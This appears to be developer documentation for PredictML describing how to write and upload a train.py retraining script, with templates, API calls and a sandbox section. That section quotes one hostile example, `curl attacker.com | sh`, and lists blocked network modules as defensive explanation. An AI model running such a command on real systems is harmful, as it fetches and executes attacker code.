# Guide — Writing a train.py Script Compatible with PredictML

This guide explains how to write a `train.py` script compatible with PredictML's automatic retraining system.

---

## Why a train.py?

If you provide a `train.py` when uploading a model, you can then:
- Trigger a manual retrain from the API or dashboard
- Schedule an automatic retrain via a cron expression
- Trigger a reactive retrain when drift exceeds a threshold

---

## Mandatory Contract

Your script **must**:

1. **Read three environment variables** (automatically injected by the API):
   - `TRAIN_START_DATE` — start date in `YYYY-MM-DD` format
   - `TRAIN_END_DATE` — end date in `YYYY-MM-DD` format
   - `OUTPUT_MODEL_PATH` — absolute path where to save the `.joblib`

2. **Save the model** to `OUTPUT_MODEL_PATH` via `joblib.dump()`

3. **Print a JSON to stdout** (last JSON line) containing at minimum:
   ```json
   {"accuracy": 0.95, "f1_score": 0.94}
   ```

4. **Exit with code 0** on success, non-zero on failure

---

## Available Environment Variables

| Variable | Required | Description |
|---|---|---|
| `TRAIN_START_DATE` | Yes | Start date of the training window (YYYY-MM-DD) |
| `TRAIN_END_DATE` | Yes | End date of the training window (YYYY-MM-DD) |
| `OUTPUT_MODEL_PATH` | Yes | Absolute path of the `.joblib` file to produce |
| `MLFLOW_TRACKING_URI` | No | MLflow server URI (e.g. `http://mlflow:5000`) |
| `MODEL_NAME` | No | Source model name |

---

## Expected JSON Output (stdout)

The **last JSON line** of stdout is parsed by the API to update the DB and the MLflow run.

### Required fields
```json
{"accuracy": 0.95, "f1_score": 0.94}
```

### Optional fields (enrich MLflow + requirements.txt)
```json
{
    "accuracy": 0.95,
    "f1_score": 0.94,
    "n_rows": 12450,
    "feature_stats": {
        "sepal_length": {"mean": 5.8, "std": 0.83, "min": 4.3, "max": 7.9, "null_rate": 0.0}
    },
    "label_distribution": {
        "setosa": 0.33, "versicolor": 0.34, "virginica": 0.33
    },
    "dependencies": {
        "scikit-learn": "1.6.1",
        "numpy": "2.2.5",
        "pandas": "2.3.3"
    }
}
```

> **`dependencies`**: used by the API to generate the `requirements.txt` stored in MinIO
> and logged as an MLflow artifact. If absent, the API statically analyses the script's imports.

> **Important**: Do not print anything after this `print()`. Progress should go to `stderr`.

---

## Minimal Template

```python
"""train.py — Minimal template compatible with PredictML"""
import json
import os
import joblib
import sys

from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score, f1_score
from sklearn.model_selection import train_test_split

# ── Environment variables (REQUIRED) ──────────────────────────────────────────
TRAIN_START_DATE = os.environ["TRAIN_START_DATE"]
TRAIN_END_DATE   = os.environ["TRAIN_END_DATE"]
OUTPUT_MODEL_PATH = os.environ["OUTPUT_MODEL_PATH"]

print(f"[train.py] Training from {TRAIN_START_DATE} to {TRAIN_END_DATE}", file=sys.stderr)

# ── Load data ────────────────────────────────────────────────────────────────
# REPLACE this block with your own data loading (CSV, DB, API, etc.)
# Filter on [TRAIN_START_DATE, TRAIN_END_DATE]
import pandas as pd

df = pd.read_csv("data/training_data.csv", parse_dates=["date"])
df = df[(df["date"] >= TRAIN_START_DATE) & (df["date"] <= TRAIN_END_DATE)]

if df.empty:
    print(json.dumps({"error": "No data for this date range"}))
    sys.exit(1)

feature_cols = ["feature_1", "feature_2", "feature_3"]
X = df[feature_cols]
y = df["target"]

# ── Training ──────────────────────────────────────────────────────────────────
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

model = RandomForestClassifier(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# ── Evaluation ────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)
acc = float(accuracy_score(y_test, y_pred))
f1  = float(f1_score(y_test, y_pred, average="weighted", zero_division=0))
print(f"[train.py] Accuracy={acc:.4f}, F1={f1:.4f}", file=sys.stderr)

# ── Save (REQUIRED) ──────────────────────────────────────────────────────────
joblib.dump(model, OUTPUT_MODEL_PATH)
print(f"[train.py] Model saved: {OUTPUT_MODEL_PATH}", file=sys.stderr)

# ── JSON stdout (LAST LINE — read by the API) ──────────────────────────────────
print(json.dumps({"accuracy": round(acc, 4), "f1_score": round(f1, 4)}))
```

---

## Template with MLflow and feature stats

```python
"""train.py — Template with MLflow + feature_stats for drift detection"""
import json
import os
import joblib
import sys

import numpy as np
import pandas as pd
from sklearn.ensemble import GradientBoostingClassifier
from sklearn.metrics import accuracy_score, f1_score
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder

# ── Environment variables ─────────────────────────────────────────────────────
TRAIN_START_DATE    = os.environ["TRAIN_START_DATE"]
TRAIN_END_DATE      = os.environ["TRAIN_END_DATE"]
OUTPUT_MODEL_PATH   = os.environ["OUTPUT_MODEL_PATH"]
MODEL_NAME          = os.environ.get("MODEL_NAME", "my_model")
MLFLOW_TRACKING_URI = os.environ.get("MLFLOW_TRACKING_URI", "")

print(f"[{MODEL_NAME}] Training {TRAIN_START_DATE} → {TRAIN_END_DATE}", file=sys.stderr)

# ── Data ───────────────────────────────────────────────────────────────────────
df = pd.read_parquet("s3://my-bucket/data/training.parquet")  # Adapt as needed
df = df[(df["date"] >= TRAIN_START_DATE) & (df["date"] <= TRAIN_END_DATE)]

FEATURES = ["age", "income", "score", "tenure_days"]
TARGET   = "churned"

if len(df) < 100:
    print(json.dumps({"error": f"Only {len(df)} rows — training cancelled"}))
    sys.exit(1)

print(f"[{MODEL_NAME}] {len(df)} rows loaded", file=sys.stderr)

X = df[FEATURES].fillna(0)
y = df[TARGET]

# ── Training ──────────────────────────────────────────────────────────────────
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

model = GradientBoostingClassifier(
    n_estimators=200,
    learning_rate=0.05,
    max_depth=4,
    random_state=42,
)
model.fit(X_train, y_train)
print(f"[{MODEL_NAME}] Training complete on {len(X_train)} samples", file=sys.stderr)

# ── Evaluation ────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)
acc = float(accuracy_score(y_test, y_pred))
f1  = float(f1_score(y_test, y_pred, average="weighted", zero_division=0))
print(f"[{MODEL_NAME}] Accuracy={acc:.4f} | F1={f1:.4f}", file=sys.stderr)

# ── Save ────────────────────────────────────────────────────────────────────────
joblib.dump(model, OUTPUT_MODEL_PATH)
print(f"[{MODEL_NAME}] Model → {OUTPUT_MODEL_PATH}", file=sys.stderr)

# ── Stats for drift detection and MLflow ─────────────────────────────────────
feature_stats = {
    col: {
        "mean":      round(float(X_train[col].mean()), 4),
        "std":       round(float(X_train[col].std()), 4),
        "min":       round(float(X_train[col].min()), 4),
        "max":       round(float(X_train[col].max()), 4),
        "null_rate": round(float(X_train[col].isna().mean()), 4),
    }
    for col in FEATURES
}

label_counts    = y_train.value_counts()
label_total     = len(y_train)
label_distribution = {
    str(k): round(float(v) / label_total, 4)
    for k, v in label_counts.items()
}

# ── JSON stdout (LAST LINE — required) ─────────────────────────────────────
print(json.dumps({
    "accuracy":           round(acc, 4),
    "f1_score":           round(f1, 4),
    "n_rows":             len(X_train),
    "feature_stats":      feature_stats,
    "label_distribution": label_distribution,
}))
```

---

## Template for Regression Model

```python
"""train.py — Regression with scikit-learn"""
import json
import os
import joblib
import sys

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestRegressor
from sklearn.metrics import mean_absolute_error, mean_squared_error, r2_score
from sklearn.model_selection import train_test_split

# ── Environment variables ─────────────────────────────────────────────────────
TRAIN_START_DATE  = os.environ["TRAIN_START_DATE"]
TRAIN_END_DATE    = os.environ["TRAIN_END_DATE"]
OUTPUT_MODEL_PATH = os.environ["OUTPUT_MODEL_PATH"]

# ── Data ───────────────────────────────────────────────────────────────────────
df = pd.read_csv("data/prices.csv", parse_dates=["date"])
df = df[(df["date"] >= TRAIN_START_DATE) & (df["date"] <= TRAIN_END_DATE)]

FEATURES = ["surface_m2", "rooms", "floor", "distance_center_km"]
TARGET   = "price_eur"

X = df[FEATURES]
y = df[TARGET]

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

# ── Training ──────────────────────────────────────────────────────────────────
model = RandomForestRegressor(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# ── Evaluation ────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)
mae  = float(mean_absolute_error(y_test, y_pred))
rmse = float(np.sqrt(mean_squared_error(y_test, y_pred)))
r2   = float(r2_score(y_test, y_pred))

# For regression models, accuracy = R² (between 0 and 1)
# f1_score = 1 - MAE/mean(y) (relative error proportion)
acc = max(0.0, r2)
f1  = max(0.0, 1.0 - mae / float(y_test.mean()))

print(f"[train.py] MAE={mae:.2f}, RMSE={rmse:.2f}, R²={r2:.4f}", file=sys.stderr)

# ── Save ────────────────────────────────────────────────────────────────────────
joblib.dump(model, OUTPUT_MODEL_PATH)

# ── JSON stdout ───────────────────────────────────────────────────────────────
print(json.dumps({
    "accuracy": round(acc, 4),
    "f1_score": round(f1, 4),
    "n_rows":   len(X_train),
    "feature_stats": {
        col: {"mean": round(float(X_train[col].mean()), 4), "std": round(float(X_train[col].std()), 4)}
        for col in FEATURES
    }
}))
```

---

## Uploading a Model with train.py

```bash
# curl
curl -X POST http://localhost:8000/models \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@my_model.joblib;type=application/octet-stream" \
  -F "train_file=@train.py" \
  -F "name=my_model" \
  -F "version=1.0.0" \
  -F "description=My classification model" \
  -F "accuracy=0.95" \
  -F "f1_score=0.94"
```

```python
# Python
import requests

with open("my_model.joblib", "rb") as f_model, open("train.py", "rb") as train:
    r = requests.post(
        "http://localhost:8000/models",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={
            "file":       ("my_model.joblib", f_model, "application/octet-stream"),
            "train_file": ("train.py", train, "text/plain"),
        },
        data={
            "name": "my_model", "version": "1.0.0",
            "accuracy": "0.95", "f1_score": "0.94",
        },
    )
```

---

## Triggering a Retrain

### Via the API

```python
response = requests.post(
    "http://localhost:8000/models/my_model/1.0.0/retrain",
    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
    json={
        "start_date":     "2025-01-01",
        "end_date":       "2025-12-31",
        "new_version":    "1.1.0",
        "set_production": False,
    }
)
data = response.json()
if data["success"]:
    print(f"New version: {data['new_version']}")
    print(f"Accuracy: {data['accuracy']}")
    print(data["stdout"][-500:])  # last logs
else:
    print(f"Error: {data['error']}")
```

### Via the Dashboard (page 8 — Retrain)
1. Select the model and source version
2. Enter the start and end dates
3. Enter the new version number
4. Click **Launch retrain**
5. Logs are displayed in real time

---

## Scheduling an Automatic Retrain

```python
# Every Monday at 3:00 UTC, 30-day window
requests.patch(
    "http://localhost:8000/models/my_model/1.0.0/schedule",
    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
    json={
        "cron":         "0 3 * * 1",
        "lookback_days": 30,
        "auto_promote": True,
        "enabled":      True,
    }
)
```

### Cron expression examples
| Expression | Trigger |
|---|---|
| `0 3 * * 1` | Every Monday at 3:00 UTC |
| `0 0 1 * *` | The 1st of every month at midnight |
| `0 2 * * *` | Every day at 2:00 UTC |
| `0 */6 * * *` | Every 6 hours |

---

## Syntax Verification (Upload Validation)

The API automatically checks that your `train.py`:
- Has valid Python syntax (`ast.parse()`)
- Only imports allowed modules (see next section)
- References `TRAIN_START_DATE`
- References `TRAIN_END_DATE`
- References `OUTPUT_MODEL_PATH`
- Contains a `joblib.dump` or `save_model` call

If validation fails, the upload is rejected with a detailed error message.

---

## Automatic Library Version Snapshot

On each model upload with `train_file` and on each retrain (manual or scheduled),
the API generates a reproducible `requirements.txt` from the versions **actually used**
by the script in the execution environment (Docker container).

### How it works

**On upload**: the API runs your `train.py` in a subprocess (timeout 120 s) with default
dates (today-30 → today). The script outputs its own dependencies in the `dependencies`
field of the JSON stdout. The API reads this field and generates the `requirements.txt`.

**On retrain**: the script runs normally. If its stdout contains `"dependencies"`,
those versions are used. Otherwise, falls back to static import analysis + `importlib.metadata`.

> If the script fails at upload (production data unavailable, timeout…), the API falls back
> automatically to static analysis. The upload is never blocked.

### What the script must output

Add the following block to your script (allowed from the `importlib` whitelist):

```python
import importlib.metadata as _imeta

_deps = {}
for _pkg in ["scikit-learn", "numpy", "pandas", "mlflow"]:  # list your packages
    try:
        _deps[_pkg] = _imeta.version(_pkg)
    except _imeta.PackageNotFoundError:
        pass
```

And include `"dependencies": _deps` in the final JSON stdout.

Example — for a script using `numpy`, `pandas`, `sklearn`:

```
numpy==2.2.5
pandas==2.2.3
scikit-learn==1.6.1
```

### Where to find the requirements.txt

| Location | Path |
|---|---|
| **MinIO** | `{model_name}/v{version}_requirements.txt` |
| **MLflow** | Artifact `environment/requirements.txt` in the retrain run |
| **API** | Field `requirements_object_key` in the `POST /models` and `GET /models` response |

### Retrieving the requirements.txt

Via the MinIO console (http://localhost:9001): browse the bucket and open the file.

Via the MinIO API (Python):

```python
from minio import Minio

client = Minio("localhost:9000", access_key="minioadmin", secret_key="minioadmin", secure=False)
data = client.get_object("predictml-models", "my_model/v1.0.0_requirements.txt")
print(data.read().decode())
```

Via MLflow UI (http://localhost:5000): open the retrain run → Artifacts tab →
`environment/` folder → `requirements.txt`.

### Implementation (for contributors)

| Element | File | Symbol |
|---|---|---|
| Import extraction + version resolution | `src/services/env_snapshot_service.py` | `generate_requirements_txt()` |
| Upload on initial upload | `src/api/models.py` | POST /models, after train.py upload |
| Upload on manual retrain | `src/api/models.py` | step 8b in retrain endpoint |
| Upload on scheduled retrain | `src/tasks/retrain_scheduler.py` | step 6 in `_do_retrain()` |
| MLflow artifact | `src/services/mlflow_service.py` | `log_retrain_run()`, param `requirements_txt` |

---

## Security & Sandbox

### Why a sandbox?

A syntactically valid `train.py` script can contain malicious code:
`os.system("curl attacker.com | sh")`, opening network sockets, reading system
files. The sandbox applies two complementary layers of protection.

---

### Layer 1 — Import Whitelist (checked at upload)

The API walks the script's AST and rejects any `import X` or `from X import ...`
whose top-level module is not in the following list:

| Module | Typical use |
|---|---|
| `os`, `sys`, `pathlib` | Environment variables, paths |
| `json`, `csv`, `io` | Serialisation, file reading |
| `joblib` | Model saving |
| `pandas`, `numpy` | Data manipulation |
| `sklearn` | Training and metrics |
| `datetime`, `time` | Time filters |
| `math`, `statistics` | Numerical computations |
| `collections`, `functools`, `itertools` | Utilities |
| `typing`, `abc`, `enum`, `dataclasses` | Type annotations |
| `copy`, `re`, `warnings`, `logging` | Common usage |

**Blocked modules** (examples): `subprocess`, `socket`, `requests`, `urllib`,
`http`, `ftplib`, `ctypes`, `paramiko`, `boto3`, `multiprocessing`.

```python
# ✅ Allowed
import os
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from datetime import datetime

# ❌ Rejected at upload — "Unauthorised import: 'subprocess'"
import subprocess
import requests
from socket import create_connection
import urllib.request
```

#### Adding a module to the whitelist

If your ML stack uses `xgboost`, `lightgbm`, `torch`, etc., open a PR
to add the module to `_ALLOWED_IMPORT_MODULES` in `src/api/models.py`.

**Do not** expose this list via an environment variable or `docker-compose`:
it is a security control that must go through a code review, not a deployment option.

---

### Layer 2 — Resource Constraints (applied at execution)

The subprocess that runs `train.py` is subject to the following limits via
`resource.setrlimit` (Linux, `preexec_fn` post-`fork`):

| Limit | Value | Effect |
|---|---|---|
| `RLIMIT_AS` | 2 GB | Maximum virtual memory — prevents an API crash by OOM |
| `RLIMIT_NOFILE` | 50 | Simultaneously open file descriptors — makes it difficult to open mass network connections |

These limits apply to both entry points:
- `POST /models/{name}/{version}/retrain` (manual endpoint)
- APScheduler (scheduled retrain)

---

### Environment Injected in the Subprocess

The script does **not** receive the full `os.environ` from the API. Only these keys are
passed, plus the functional variables:

| Key | Type |
|---|---|
| `PATH`, `HOME`, `USER`, `LANG`, `LC_ALL` | System (fixed whitelist) |
| `TMPDIR`, `TEMP`, `TMP` | System |
| `PYTHONPATH`, `PYTHONDONTWRITEBYTECODE`, `VIRTUAL_ENV` | Python |
| `TRAIN_START_DATE`, `TRAIN_END_DATE` | Functional (injected by the API) |
| `OUTPUT_MODEL_PATH`, `MLFLOW_TRACKING_URI`, `MODEL_NAME` | Functional (injected by the API) |

`DATABASE_URL`, `SECRET_KEY` and all other secrets present in the API environment
are **never** passed to the script.

---

### Implementation (for contributors)

| Element | File | Symbol |
|---|---|---|
| Whitelist + AST validation | `src/api/models.py` | `_ALLOWED_IMPORT_MODULES`, `_validate_train_script()` |
| Resource limits — endpoint | `src/api/models.py` | `_set_subprocess_limits()` |
| Resource limits — scheduler | `src/tasks/retrain_scheduler.py` | `_set_subprocess_limits()` |
| Minimal env — endpoint | `src/api/models.py` | `_safe_env_keys` |
| Minimal env — scheduler | `src/tasks/retrain_scheduler.py` | `_SAFE_ENV_KEYS` |
| Tests | `tests/test_retrain.py` | `TestValidateTrainScript` (17 tests) |

---

## Drift-Triggered Retraining

If you configure `trigger_on_drift` in the schedule, a retrain is automatically triggered when drift reaches the threshold:

```python
requests.patch(
    "http://localhost:8000/models/my_model/1.0.0/schedule",
    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
    json={
        "cron":                       "0 3 * * 1",
        "lookback_days":               30,
        "trigger_on_drift":            "critical",  # or "warning"
        "drift_retrain_cooldown_hours": 24,          # prevents loops
        "enabled":                    True,
    }
)
```
